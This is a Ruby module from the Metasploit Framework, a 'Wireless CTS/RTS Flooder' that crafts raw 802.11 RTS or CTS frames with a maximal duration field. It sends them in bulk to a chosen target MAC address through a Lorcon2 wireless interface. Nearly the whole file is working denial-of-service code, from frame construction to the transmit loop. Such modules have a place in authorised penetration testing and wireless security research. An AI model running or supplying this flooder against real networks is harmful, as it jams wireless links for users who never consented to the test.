##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Lorcon2
	include Msf::Auxiliary::Dos

	def initialize(info ={})
		super(update_info(info,
			'Name'		=> 'Wireless CTS/RTS Flooder',
			'Description' 	=> %q{
					This module sends 802.11 CTS/RTS requests to a specific wireless peer,
				using the specified source address,
			},
			'Author'	=> [ 'Brad Antoniewicz' ],
			'License'	=> MSF_LICENSE
			))

		register_options(
			[
				OptString.new('ADDR_DST',[true, "TARGET MAC (e.g 00:DE:AD:BE:EF:00)"]),
				OptString.new('ADDR_SRC',[false, "Source MAC (not needed for CTS)"]),
				OptString.new('TYPE',[true,"Type of Frame (RTS, CTS)",'RTS']),
				OptInt.new('NUM',[true, "Number of frames to send",100])
			],self.class)
	end

	def run
		case datastore['TYPE'].upcase
			when 'RTS'
				if (!datastore['ADDR_SRC'])
					print_error("FAILED: RTS Flood selected but ADDR_SRC not set!")
					return
				end
				frame = create_rts()
			when 'CTS'

				frame = create_cts()
			else
				print_error("No TYPE selected!!")
				return
		end

		open_wifi
		print_status("Sending #{datastore['NUM']} #{datastore['TYPE'].upcase} frames.....")

		datastore['NUM'].to_i.times do
			wifi.write(frame)
		end

	end
	def create_rts

		frame =
			"\xb4" +			# Type/SubType
			"\x00" +			# Flags
			"\xff\x7f" +			# Duration
			eton(datastore['ADDR_DST']) +	# dst addr
			eton(datastore['ADDR_SRC'])	# src addr

		return frame
	end
	def create_cts

		frame =
			"\xc4" +			# Type/SubType
			"\x00" +			# Flags
			"\xff\x7f" +			# Duration
			eton(datastore['ADDR_DST'])	# dst addr

		return frame
	end
end
